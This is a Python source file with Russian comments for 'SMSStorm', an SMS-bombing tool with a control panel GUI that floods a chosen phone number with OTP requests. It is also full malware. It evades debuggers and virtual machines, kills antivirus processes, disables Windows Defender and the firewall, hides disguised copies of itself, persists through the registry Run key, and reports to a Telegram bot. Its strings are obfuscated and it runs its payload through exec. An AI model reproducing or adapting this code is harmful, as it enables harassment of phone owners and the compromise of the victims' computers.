import re
import time
import os
import shutil
import winreg as reg
import socket
import subprocess
import threading
import sys
import random
import string
import requests
import base64
from Crypto.Cipher import AES
import hashlib
import psutil
import win32gui
import win32con
import ctypes
from ctypes import wintypes
import tkinter as tk
from tkinter import ttk, scrolledtext

# Генерация динамического ключа AES
def _0x1():
    return hashlib.sha256((str(time.time())).encode()).digest()[:16]

# AES-шифрование
def _0x2(key, data):
    cipher = AES.new(key, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(data.encode().ljust(16 * ((len(data) + 15) // 16))))

# AES-дешифрование
def _0x3(key, data):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.decrypt(base64.b64decode(data)).decode().rstrip()

# XOR-шифрование строк
def _0x4(data, key="storm"):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

# Дешифрование строк
def _0x5(data):
    return _0x4(data, "storm")

# Зашифрованные строки
_0x6 = _0x4("https://api.telegram.org/bot123456:ABC-DEF1234ghIjk-4567890")  # Telegram Bot API
_0x7 = _0x4("@SMSStormBot")  # Telegram Bot ID
_0x8 = _0x4(r"C:\Windows\Temp\.hidden")  # Локальная папка
_0x11 = _0x4(r"Software\Microsoft\Windows\CurrentVersion\Run")

# Генерация случайного имени
def _0x16():
    return ''.join(random.choices(string.ascii_lowercase, k=8)) + f"{random.randint(1000,9999)}"

# Системные пути
_0x17 = _0x5(_0x8)
_0x18 = random.choice(["svchost", "notepad", "cmd"]) + ".exe"
_0x19 = _0x16() + ".exe"
_0x20 = os.path.join(_0x17, _0x18)  # Основной код
_0x21 = os.path.join(_0x17, _0x19)  # Резервная копия

# Антианализ
def _0x23():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        buf = ctypes.create_string_buffer(12)
        if ctypes.windll.kernel32.GetSystemFirmwareTable(0x52534D53, 0, buf, 12):
            if b"Parallels" in buf.raw:
                return True
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 4 * 1024 * 1024 * 1024:
            return True
        time.sleep(random.randint(5, 15))
        return False
    except:
        return True

# Обход антивирусов и Firewall
def _0x24():
    av_processes = ["avp.exe", "msmpeng.exe", "norton.exe", "mcafee.exe", "eset.exe", "avg.exe", "kaspersky.exe", "defender.exe"]
    for proc in psutil.process_iter():
        try:
            if proc.name().lower() in av_processes:
                h_process = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, proc.pid)
                if h_process:
                    ctypes.windll.kernel32.TerminateProcess(h_process, 0)
                    ctypes.windll.kernel32.CloseHandle(h_process)
        except:
            pass
    try:
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
        os.system("netsh advfirewall set allprofiles state off")
    except:
        pass
    def av_watchdog():
        while True:
            for proc in psutil.process_iter():
                if proc.name().lower() in av_processes:
                    try:
                        h_process = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, proc.pid)
                        if h_process:
                            ctypes.windll.kernel32.TerminateProcess(h_process, 0)
                            ctypes.windll.kernel32.CloseHandle(h_process)
                    except:
                        pass
            time.sleep(30)
    threading.Thread(target=av_watchdog, daemon=True).start()

# Получаем путь к текущему файлу
def _0x25():
    if getattr(sys, 'frozen', False):
        return sys.executable
    return os.path.abspath(__file__)

# Автозагрузка
def _0x26(path):
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, _0x5(_0x11), 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, f"SysUpdate{random.randint(100,999)}", 0, reg.REG_SZ, f'"{path}"')
        reg.CloseKey(key)
    except:
        pass

# Проверка автозагрузки
def _0x27(path):
    while True:
        try:
            _0x26(path)
            time.sleep(random.randint(200, 400))
        except:
            pass

# Защита от удаления
def _0x28(path):
    while True:
        try:
            if not os.path.exists(path):
                shutil.copyfile(_0x25(), path)
                os.system(f'attrib +h +s "{path}"')
        except:
            pass
        time.sleep(random.randint(200, 400))

# Копируем себя
def _0x29():
    source_path = _0x25()
    try:
        os.makedirs(_0x17, exist_ok=True)
        if not os.path.exists(_0x20):
            shutil.copyfile(source_path, _0x20)
        if not os.path.exists(_0x21):
            shutil.copyfile(source_path, _0x21)
    except:
        pass

# Полиморфизм кода
def _0x30(source_path, dest_path):
    try:
        with open(source_path, "rb") as f:
            code = f.read()
        junk_code = bytes([random.randint(0, 255) for _ in range(random.randint(100, 500))])
        new_code = code + junk_code
        with open(dest_path, "wb") as f:
            f.write(new_code)
        os.system(f'attrib +h +s "{dest_path}"')
        _0x31(f"Polymorphic copy created: {dest_path}")
    except Exception as e:
        _0x32(f"[{time.ctime()}] Polymorphism error: {str(e)}", "poly_error.log")

# Отправка данных в Telegram
def _0x31(data):
    try:
        bot_api = _0x5(_0x6)
        chat_id = _0x5(_0x7)
        requests.post(f"{bot_api}/sendMessage", json={"chat_id": chat_id, "text": f"SMSStorm Report:\n{data}"})
    except:
        pass

# Шифрование локальных логов
def _0x32(data, log_file):
    try:
        key = _0x1()
        cipher = AES.new(key, AES.MODE_ECB)
        encrypted_data = base64.b64encode(cipher.encrypt(data.encode().ljust(16 * ((len(data) + 15) // 16))))
        with open(os.path.join(_0x17, log_file), "ab") as f:
            f.write(encrypted_data + b"\n")
    except:
        pass

# SMS-атака
def _0x50(phone_number, stop_event, log_text):
    def send_sms(phone_number, service, log_text):
        try:
            # Фейковые API (пример, заменить реальными)
            services = [
                {"url": "https://api.example1.com/register", "data": {"phone": phone_number, "action": "send_otp"}},
                {"url": "https://api.example2.com/signup", "data": {"mobile": phone_number}},
                {"url": "https://api.example3.com/verify", "data": {"number": phone_number, "type": "sms"}}
            ]
            service_data = services[service % len(services)]
            response = requests.post(service_data["url"], data=service_data["data"], timeout=5)
            if response.status_code == 200:
                _0x32(f"[{time.ctime()}] SMS sent to {phone_number} via service {service}", "sms.log")
                _0x31(f"SMS sent to {phone_number} via service {service}")
                log_text.insert(tk.END, f"SMS sent to {phone_number} via service {service}\n")
            else:
                log_text.insert(tk.END, f"Failed to send SMS to {phone_number} via service {service}\n")
        except Exception as e:
            _0x32(f"[{time.ctime()}] SMS error: {str(e)}", "sms.log")
            log_text.insert(tk.END, f"SMS error for {phone_number}: {str(e)}\n")

    service_counter = 0
    while not stop_event.is_set():
        send_sms(phone_number, service_counter, log_text)
        service_counter += 1
        time.sleep(random.randint(5, 15))  # Задержка для избежания блокировок

# GUI
def _0x46():
    root = tk.Tk()
    root.title("SMSStorm Control Panel")
    root.geometry("600x400")
    root.resizable(False, False)

    stop_event = threading.Event()
    attack_thread = None

    # Главный фрейм
    main_frame = ttk.Frame(root)
    main_frame.pack(pady=10, padx=10, fill="both", expand=True)

    # Поле для номера телефона
    tk.Label(main_frame, text="Номер телефона (+1234567890):").pack()
    phone_var = tk.StringVar()
    phone_entry = tk.Entry(main_frame, textvariable=phone_var, width=20)
    phone_entry.pack(pady=5)

    # Лог событий
    log_text = scrolledtext.ScrolledText(main_frame, height=10, width=60)
    log_text.pack(pady=5)

    def start_attack():
        nonlocal attack_thread
        phone = phone_var.get()
        if not phone.startswith("+") or not phone[1:].isdigit():
            log_text.insert(tk.END, "Ошибка: Введите номер в формате +1234567890\n")
            return
        stop_event.clear()
        attack_thread = threading.Thread(target=_0x50, args=(phone, stop_event, log_text), daemon=True)
        attack_thread.start()
        log_text.insert(tk.END, f"Запущена SMS-атака на {phone}\n")
        _0x31(f"SMS attack started on {phone}")

    def stop_attack():
        stop_event.set()
        if attack_thread:
            attack_thread.join(timeout=5.0)
        log_text.insert(tk.END, "SMS-атака остановлена\n")
        _0x31("SMS attack stopped")

    # Кнопки
    tk.Button(main_frame, text="Запустить SMS-атаку", command=start_attack).pack(pady=5)
    tk.Button(main_frame, text="Остановить атаку", command=stop_attack).pack(pady=5)

    root.mainloop()

# Динамическое выполнение
def _0x47():
    key = _0x1()
    code = _0x3(key, _0x2(key, '''
_0x24()  # Обход защиты
_0x29()  # Копирование
_0x30(_0x25(), _0x20)  # Полиморфная копия
_0x26(_0x20)  # Автозагрузка
threading.Thread(target=_0x27, args=(_0x20,), daemon=True).start()
threading.Thread(target=_0x28, args=(_0x20,), daemon=True).start()
_0x46()  # Запуск GUI
'''))
    exec(code)

# Запуск
if __name__ == "__main__":
    if _0x23():
        sys.exit(0)
    _0x47()